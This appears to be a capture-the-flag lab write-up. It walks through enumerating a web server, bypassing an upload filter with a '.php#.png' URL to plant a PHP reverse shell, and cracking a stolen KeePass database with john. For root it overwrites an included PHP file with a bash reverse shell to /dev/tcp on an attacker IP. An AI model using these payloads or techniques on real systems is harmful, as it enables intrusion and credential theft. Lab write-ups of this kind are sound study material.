# User flag

Nmap shows 4 open ports

In port 80, there is a web server, with a login page

We try sqli but fail

Lets explore some directories using gobuster

We find 2 directories: `css`  and `cloud` 

We have some sort of storage in `cloud`

We can upload an external URL here

Download the reverse shell script from pentest-monkey

Open a simple python server using `python3 -m http.server 1234` 

Upload the file URL as:

`http://IP:Port/reverse-shell.php#.png`

This will bypass the filter

Make sure you are listening on the port mentioned in the reverse-shell

We will get a shell

In `/opt` , we find a `dataset.kbdx`  file. Open a simple server on the victim, and transfer the dataset to your device

We can view the dataset using `keepassxc` 

Let’s crack the password using John the ripper first

```bash
keepass2john dataset.kbdx > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Now, open the keepass, we see password for the sysadmin

Get the local.txt flag


# Root flag

In the scripts directory, when reading the code, we see that there is a  `backup.inc.php` file

Let’s delete it

Create your own `backup.inc.php` file, which should contain:

```bash
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.17.20.243/1337 0>&1'");
```

Open a simple python server, and bring it to the victim machine

Make sure you are listening on the specified port

We will now get shell as a root user

Get the flag
